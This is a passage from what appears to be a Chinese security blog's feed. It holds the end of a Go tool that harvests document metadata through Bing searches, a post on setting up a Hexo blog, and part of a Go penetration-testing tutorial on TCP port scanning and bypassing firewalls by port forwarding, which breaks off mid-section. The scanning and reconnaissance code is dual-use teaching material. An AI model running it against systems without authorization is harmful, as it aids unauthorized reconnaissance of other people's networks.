class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;archive/zip&quot;</span></span><br><span class="line"><span class="string">&quot;bing/metadata&quot;</span></span><br><span class="line"><span class="string">&quot;bytes&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/PuerkitoBio/goquery&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;net/url&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handler</span><span class="params">(i <span class="type">int</span>, s *goquery.Selection)</span></span> &#123;</span><br><span class="line">url, ok := s.Find(<span class="string">&quot;a&quot;</span>).Attr(<span class="string">&quot;href&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Printf(<span class="string">&quot;%d: %s\n&quot;</span>, i, url)</span><br><span class="line">res, err := http.Get(url)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">buf, err := ioutil.ReadAll(res.Body)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> res.Body.Close()</span><br><span class="line"></span><br><span class="line">r, err := zip.NewReader(bytes.NewReader(buf), <span class="type">int64</span>(<span class="built_in">len</span>(buf)))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cp, ap, err := metadata.NewProperties(r)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">log.Printf(</span><br><span class="line"><span class="string">&quot;%21s %s - %s %s\n&quot;</span>,</span><br><span class="line">cp.Creator,</span><br><span class="line">cp.LastModifiedBy,</span><br><span class="line">ap.Application,</span><br><span class="line">ap.GetMajorVersion())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(os.Args) != <span class="number">3</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;Missing required argument. Usage: main.go &lt;domain&gt; &lt;ext&gt;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">domain := os.Args[<span class="number">1</span>]</span><br><span class="line">filetype := os.Args[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">q := fmt.Sprintf(</span><br><span class="line"><span class="string">&quot;site:%s &amp;&amp; filetype:%s &amp;&amp; instreamset:(url title):%s&quot;</span>,</span><br><span class="line">domain,</span><br><span class="line">filetype,</span><br><span class="line">filetype)</span><br><span class="line"></span><br><span class="line">search := fmt.Sprintf(<span class="string">&quot;http://www.bing.com/search?q=%s&quot;</span>, url.QueryEscape(q))</span><br><span class="line">res, err := http.Get(search)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">doc, err := goquery.NewDocumentFromReader(res.Body)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> res.Body.Close()</span><br><span class="line">s := <span class="string">&quot;html body div#b_content ol#b_results li.b_algo h2&quot;</span></span><br><span class="line">doc.Find(s).Each(handler)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">对Go渗透测试中的一些学习</summary>
    
    
    
    <category term="Go渗透测试" scheme="https://h0ld1rs.github.io/categories/Go%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="Golang,渗透测试" scheme="https://h0ld1rs.github.io/tags/Golang-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>博客搭建</title>
    <link href="https://h0ld1rs.github.io/posts/26832.html"/>
    <id>https://h0ld1rs.github.io/posts/26832.html</id>
    <published>2022-03-01T10:46:08.000Z</published>
    <updated>2022-03-01T10:47:54.908Z</updated>
    
    <content type="html"><![CDATA[<h1 id="懒人搭建博客"><a href="#懒人搭建博客" class="headerlink" title="懒人搭建博客"></a>懒人搭建博客</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近想重启博客这个东西，发一些自己写的笔记啥的，由于重装系统之后之前的东西都不见了，所以，，还得重新来一下(xdm，一定要做好备份啊，不要憨憨的不备份重装系统)</p><p>搭建其实还是使用最简单的<code>hexo + butterfly</code>搭建的，没有什么难点，主要是遇到了一个在<code>butterfly</code>主题修改<code>_config.yml</code>的时候，有一个背景图片始终无法加载成功，但是在本地预览的时候是可以正常访问的，在<code>hexo d</code>后则是不能访问，在把<code>public</code>文件夹放置公网后发现，发现应该是<code>nodejs</code>版本的问题，最后解决成功了，，(菜鸡花了两天时间)</p><p>这里就放一下用到的命令和对应的版本吧</p><blockquote><p>#需要安装的东西<br>npm install –save hexo-deployer-git<br>npm install –save hexo-renderer-jade hexo-generator-feed hexo-generator-sitemap hexo-browsersync hexo-generator-archive</p><p>#主题</p><p>git clone -b master <a href="https://github.com/jerryc127/hexo-theme-butterfly.git">https://github.com/jerryc127/hexo-theme-butterfly.git</a> themes&#x2F;Butterfly</p><p>#环境</p><p>npm 8.3.1<br>node v16.14.0<br>hexo-cli: 4.3.0<br>os: win32 10.0.22000<br>node: 16.14.0<br>v8: 9.4.146.24-node.20<br>uv: 1.43.0<br>zlib: 1.2.11<br>brotli: 1.0.9<br>ares: 1.18.1<br>modules: 93<br>nghttp2: 1.45.1<br>napi: 8<br>llhttp: 6.0.4<br>openssl: 1.1.1m+quic<br>cldr: 40.0<br>icu: 70.1<br>tz: 2021a3<br>unicode: 14.0<br>ngtcp2: 0.1.0-DEV<br>nghttp3: 0.1.0-DEV</p></blockquote><p>新手搭建博客请看：<a href="https://yafine-blog.cn/posts/4ab2.html">https://yafine-blog.cn/posts/4ab2.html</a></p><p>nodejs 使用了某文章师傅提到的<code>nvm</code>，有兴趣的师傅可以了解一下，和<code>jenv</code>差不多效果的东西</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220301100318.png"></p><h2 id="图片问题"><a href="#图片问题" class="headerlink" title="图片问题"></a>图片问题</h2><p>解决图片我使用了<code>picgo</code>，可以直接转换成<code>markdown</code>形式的图片</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220301112311.png"></p><h2 id="后端评论区通知"><a href="#后端评论区通知" class="headerlink" title="后端评论区通知"></a>后端评论区通知</h2><p>这里试了好些方法，有下面几位师傅的链接</p><p><code>Valine</code> :  <a href="https://blog.csdn.net/weixin_34434736/article/details/113047474">https://blog.csdn.net/weixin_34434736/article/details/113047474</a></p><p>​            <a href="https://blog.lete114.top/article/Valine-LeanCloud-Config.html">https://blog.lete114.top/article/Valine-LeanCloud-Config.html</a></p><p>​    使用这种方法应该不错，但是我又找了找，选择了另外一种方法</p><p><code>Twikoo+腾讯云评论配置</code>：这个我选择了<code>Server酱</code>发送消息</p><p>​    <a href="https://xiaoliblog.cn/page/comments.html#%E8%A7%86%E9%A2%91%E8%A7%82%E7%9C%8B">https://xiaoliblog.cn/page/comments.html#%E8%A7%86%E9%A2%91%E8%A7%82%E7%9C%8B</a></p><p>整体来说比较简单，效果也很好</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220301095948.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220301100017.png"></p><h2 id="url优化"><a href="#url优化" class="headerlink" title="url优化"></a>url优化</h2><p>一般来说，SEO搜索引擎优化认为，网站的最佳结构是 <strong>用户从首页点击三次就可以到达任何一个页面</strong>，但是我们使用<code>Hexo</code>编译的站点结构的<code>URL</code>是：<code>域名/年/月/日/文章标题</code>四层的结构，这样的<code>URL</code>结构很不利于<code>SEO</code>，爬虫就会经常爬不到我们的文章，于是，我们需要优化一下网站文章的<code>URL</code></p><h3 id="方案一："><a href="#方案一：" class="headerlink" title="方案一："></a><strong>方案一</strong>：</h3><p>直接改成<code>域名/文章标题</code>的形式，在<code>Hexo配置文件</code>中修改<code>permalink</code>如下：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># URL</span></span><br><span class="line"><span class="comment">## If your site is put in a subdirectory, set url as &#x27;http://yoursite.com/child&#x27; and root as &#x27;/child/&#x27;</span></span><br><span class="line"><span class="attr">url:</span> <span class="string">https://blog.sky03.cn</span></span><br><span class="line"><span class="attr">root:</span> <span class="string">/</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">:title.html</span></span><br><span class="line"><span class="attr">permalink_defaults:</span></span><br></pre></td></tr></table></figure><p><strong>这个方式有个不好的地方：</strong></p><p>直接以<code>文章的标题</code>作为URL，而我们所写的文章的标题一般都是中文，但是URL只能用字母数字和标点符号表示，所以中文的URL只能被转义成一堆符号，而且还特别长。</p><h3 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h3><p>插件</p><p>插件作用：自动为每篇文章生成一串数字作每篇文章的URI地址。每篇文章的<code>Front-matter</code>中会自动增加一个配置项：<code>abbrlink: xxxxx</code>，该项的值就是当前文章的URI地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-abbrlink --save</span><br></pre></td></tr></table></figure><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># hexo-abbrlink config 、固定文章地址插件</span></span><br><span class="line"><span class="attr">abbrlink:</span></span><br><span class="line">  <span class="attr">alg:</span> <span class="string">crc16</span>  <span class="comment">#算法选项：crc16、crc32，区别见之前的文章，这里默认为crc16丨crc32比crc16复杂一点，长一点</span></span><br><span class="line">  <span class="attr">rep:</span> <span class="string">dec</span>    <span class="comment">#输出进制：十进制和十六进制，默认为10进制。丨dec为十进制，hex为十六进制</span></span><br></pre></td></tr></table></figure><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># URL</span></span><br><span class="line"><span class="comment">## If your site is put in a subdirectory, set url as &#x27;http://yoursite.com/child&#x27; and root as &#x27;/child/&#x27;</span></span><br><span class="line"><span class="attr">url:</span> <span class="string">https://blog.sky03.cn</span></span><br><span class="line"><span class="attr">root:</span> <span class="string">/</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">posts/:abbrlink.html</span></span><br><span class="line"><span class="attr">permalink_defaults:</span></span><br></pre></td></tr></table></figure><h2 id="被谷歌和百度收录"><a href="#被谷歌和百度收录" class="headerlink" title="被谷歌和百度收录"></a>被谷歌和百度收录</h2><p>参考文章：<a href="https://blog.sky03.cn/posts/42790.html#toc-heading-25">https://blog.sky03.cn/posts/42790.html#toc-heading-25</a></p><p>谷歌好说，在谷歌网站站长把<code>github page</code>收录进去即可（<a href="https://search.google.com/search-console?%EF%BC%89">https://search.google.com/search-console?）</a></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220301112215.png"></p><p><del>百度的话，(如果没有域名)目前为止好像很麻烦，就不弄了。</del></p><p>好像，，现在可以了？？，和谷歌收录的方法一样。</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220301150646.png"></p><p>那就等第二天过来看吧，，(百度搜索资源平台)</p><h2 id="提交"><a href="#提交" class="headerlink" title="提交"></a>提交</h2><ol><li>自动提交（分三种）<ul><li>主动推送</li><li>自动推送</li><li>sitemap（站点地图）</li></ul></li><li>手动提交<ul><li>即手动地将链接一次性提交给百度</li></ul></li></ol><p>一般自动提交比手动提交效果好一点，自动提交又从效率上来说：</p><p><strong>主动推送&gt;自动推送&gt;sitemap</strong></p><h3 id="自动提交的三种方法"><a href="#自动提交的三种方法" class="headerlink" title="自动提交的三种方法"></a>自动提交的三种方法</h3><ol><li><code>主动推送</code>：最为快速的提交方式。将站点当天新产出链接通过此方式推送给百度，以保证新链接可以及时被百度收录。</li><li><code>自动推送</code>：最为便捷的提交方式。将自动推送的JS代码部署在站点的每一个页面源代码中，当部署代码的页面在每次被浏览时，链接就会被自动推送给百度。可以与主动推送配合使用。</li><li><code>sitemap</code>：您可以定期将网站链接放到<code>sitemap文件</code>中，然后将<code>sitemap文件</code>提交给百度。百度会周期性的抓取检查您提交的<code>sitemap</code>，对其中的链接进行处理，但收录速度慢于主动推送。</li></ol><p>这里我选择主动推送，安装插件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-baidu-url-submit --save</span><br></pre></td></tr></table></figure><p>然后打开<code>hexo配置文件</code>，在末尾加入以下配置：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># hexo-baidu-url-submit  百度主动推送</span></span><br><span class="line"><span class="attr">baidu_url_submit:</span></span><br><span class="line">  <span class="attr">count:</span> <span class="number">80</span> <span class="comment"># 提交最新的一个链接</span></span><br><span class="line">  <span class="attr">host:</span> <span class="string">blog.sky03.cn</span> <span class="comment"># 在百度站长平台中注册的域名</span></span><br><span class="line">  <span class="attr">token:</span> <span class="string">xxxxxxx</span> <span class="comment"># 请注意这是您的秘钥， 所以请不要把博客源代码发布在公众仓库里!</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">baidu_urls.txt</span> <span class="comment"># 文本文档的地址， 新链接会保存在此文本文档里</span></span><br></pre></td></tr></table></figure><p>再加入新的<code>deploy</code>：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">type:</span> <span class="string">baidu_url_submitter</span></span><br></pre></td></tr></table></figure><p>到这里就完成了，，，等待明天的收录审核</p>]]></content>
    
    
    <summary type="html">重新打算开启博客，往上放电有用的东西</summary>
    
    
    
    <category term="奇奇怪怪" scheme="https://h0ld1rs.github.io/categories/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA/"/>
    
    
    <category term="博客搭建" scheme="https://h0ld1rs.github.io/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>go渗透测试笔记(二)</title>
    <link href="https://h0ld1rs.github.io/posts/31081.html"/>
    <id>https://h0ld1rs.github.io/posts/31081.html</id>
    <published>2022-02-18T13:37:21.000Z</published>
    <updated>2022-03-01T13:48:33.448Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Go渗透测试笔记-二-—TCP，扫描器和代理"><a href="#Go渗透测试笔记-二-—TCP，扫描器和代理" class="headerlink" title="Go渗透测试笔记(二)—TCP，扫描器和代理"></a>Go渗透测试笔记(二)—TCP，扫描器和代理</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>TCP是面向连接协议的主要标准，也是现代网络的基础。</p><p>作为攻击者，我们应当了解TCP的工作原理，并且能够开发可用的TCP结构体，以便可以识别 打开&#x2F;关闭 的端口，找出错误的结果。</p><p>如误判(syn-flood防护)以及通过端口转发绕过出口限制等等。</p><h2 id="0x01-理解TCP的握手机制"><a href="#0x01-理解TCP的握手机制" class="headerlink" title="0x01 理解TCP的握手机制"></a>0x01 理解TCP的握手机制</h2><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220219190005.png"></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220219190050.png"></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220219190247.png"></p><h2 id="0x02-通过端口转发绕过防火墙"><a href="#0x02-通过端口转发绕过防火墙" class="headerlink" title="0x02 通过端口转发绕过防火墙"></a>0x02 通过端口转发绕过防火墙</h2><p>企业组织可以配置防火墙，以防止客户端连接到某些服务器和端口，同时允许访问其他服务器和端口。我们可以使用中间系统代理连接绕过或者穿透防火墙，从而绕过这些限制。</p><blockquote><p>许多企业网络会限制内部资产建立与恶意站点的HTTP连接。假设有一个名为<code>evil.com</code>的恶意网站。如果有员工直接浏览evil.com，则浏览器会阻止，但是，如果员工拥有允许通过防火墙的外部系统，(如 stacktian.com)，则员工可以利用允许的域来反弹与<code>evil.com</code>的连接</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220219191150.png"></p><p>可以使用端口转发绕过多种限制性网络配置，例如，可以通过跳箱转发流量，以访问网络或者访问绑定到限制性接口的端口</p><h2 id="0x03-编写一个TCP扫描器"><a href="#0x03-编写一个TCP扫描器" class="headerlink" title="0x03 编写一个TCP扫描器"></a>0x03 编写一个TCP扫描器</h2><h4 id="1-测试端口的可用性"><a href="#1-测试端口的可用性" class="headerlink" title="1. 测试端口的可用性"></a>1. 测试端口的可用性</h4><p>创建端口扫描器的第一步是了解如何启动从客户端到服务器组件的相连，在整个示例中，我们需要连接并扫描<code>scanme.nmap.org</code>，为此我们需要使用nmap的包：<code>net.Dial(network,address string)</code></p><p>第一个参数是一个字符串，用于识别标识要启动的连接类型，这是因为<code>Dial</code>不仅适用于TCP，还可以用于创建使用<code>Unix</code>套接字，UDP和第四层协议连接。</p><p>第二个参数需要连接的主机，对于<code>IPV4/TCP</code>连接，字符串使用<code>host:port</code>的形式进行连接</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">_,err := net.Dial(<span class="string">&quot;tcp&quot;</span>,<span class="string">&quot;scanme.nmap.org:80&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;连接成功&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="2-执行非并发扫描"><a href="#2-执行非并发扫描" class="headerlink" title="2. 执行非并发扫描"></a>2. 执行非并发扫描</h4><p>一次扫描一个端口没有什么用，TCP的端口为”1–65535”，作为测试，我们这里选择 1024，使用 <code>for</code>循环</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i:=<span class="number">1</span>; i&lt;=<span class="number">1024</span>; i++&#123;</span><br><span class="line">address := fmt.Sprintf(<span class="string">&quot;scanme.nmap.org:%d&quot;</span>,i)</span><br><span class="line">fmt.Println(address)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>剩下的就是进行连接，我们还应该加入一些逻辑来关闭连接，这样就不会一直处于一个打开的状态，需要在Conn上调用Close()</p><blockquote><p>Sprintf：用传入的格式化规则符将传入的变量格式化，(终端中不会有显示)</p><p>Printf：用传入的格式化规则符将传入的变量写入到标准输出里面(即在终端中有显示)，</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i:=<span class="number">79</span>; i&lt;=<span class="number">100</span>; i++&#123;</span><br><span class="line">address := fmt.Sprintf(<span class="string">&quot;scanme.nmap.org:%d&quot;</span>,i)</span><br><span class="line">conn,err := net.Dial(<span class="string">&quot;tcp&quot;</span>,address)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">//端口已关闭或者过滤</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">conn.Close()</span><br><span class="line">fmt.Printf(<span class="string">&quot;%d open\n&quot;</span>,i)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="3-执行非并发扫描"><a href="#3-执行非并发扫描" class="headerlink" title="3. 执行非并发扫描"></a>3. 执行非并发扫描</h4><p>上面的例子中我们是进行单个扫描，没有同时扫描，这将浪费很多的时间，于是我们需要使用<code>gorountine</code>提高扫描器的速度，其数量受到系统处理能力和可用内存的限制</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">1</span>; i &lt; <span class="number">1024</span>; i++ &#123;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(j <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">address := fmt.Sprintf(<span class="string">&quot;scanme.nmap.org:%d&quot;</span>,j)</span><br><span class="line">conn,err := net.Dial(<span class="string">&quot;tcp&quot;</span>,address)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">//端口已关闭或者过滤</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">conn.Close()</span><br><span class="line">fmt.Printf(<span class="string">&quot;%d open\n&quot;</span>,j)</span><br><span class="line">&#125;(i)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们写出这样的代码的时候，程序几乎是立马就退出了，因为运行的代码会为每一个连接启动一个<code>gorountine,</code>而主<code>gorountine</code>不知道要等待连接发生，代码会在for循环完成之后立刻退出，这可能比端口之间的网络包交换还要快，无法直接获得准确结果。所以我们需要使用<code>sync</code>包中的<code>WaitGroup</code>方法</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br></pre></td></tr></table></figure><p>创建<code>WaitGroup</code>以后，可以调用一些方法</p><ol><li>Add(int)，他将按所提供的数字递增内部的计算器</li><li>Done() 将计算器减一</li><li>Wait() 会阻止其中调用它的<code>gorountine</code>的执行，并且在内部计算器到达0之前不允许进一步执行。</li></ol><h4 id="4-1-使用WaitGroup进行同步扫描"><a href="#4-1-使用WaitGroup进行同步扫描" class="headerlink" title="4. 1 使用WaitGroup进行同步扫描"></a>4. 1 使用WaitGroup进行同步扫描</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line"><span class="string">&quot;sync&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">1</span>; i &lt; <span class="number">1024</span>; i++ &#123;</span><br><span class="line">wg.Add(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(j <span class="type">int</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> wg.Done()</span><br><span class="line">address := fmt.Sprintf(<span class="string">&quot;scanme.nmap.org:%d&quot;</span>,j)</span><br><span class="line">conn,err := net.Dial(<span class="string">&quot;tcp&quot;</span>,address)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">//端口已关闭或者过滤</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">conn.Close()</span><br><span class="line">fmt.Printf(<span class="string">&quot;%d open\n&quot;</span>,j)</span><br><span class="line">&#125;(i)</span><br><span class="line">&#125;</span><br><span class="line">wg.Wait()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在此版本中，创建了<code>WaitGroup()</code>用作同步计算器，每次创建<code>gorounine</code>扫描端口的时候，都可以通过<code>wg.Add(1)</code>递增计数器，然后使用<code>Done()递减</code>，在<code>main</code>中调用<code>wg.Wait()</code>将阻塞所有进程直到计数器为0为止</p><h4 id="4-2-工人池–-gt-多通道通信"><a href="#4-2-工人池–-gt-多通道通信" class="headerlink" title="4.2 工人池–&gt;多通道通信"></a>4.2 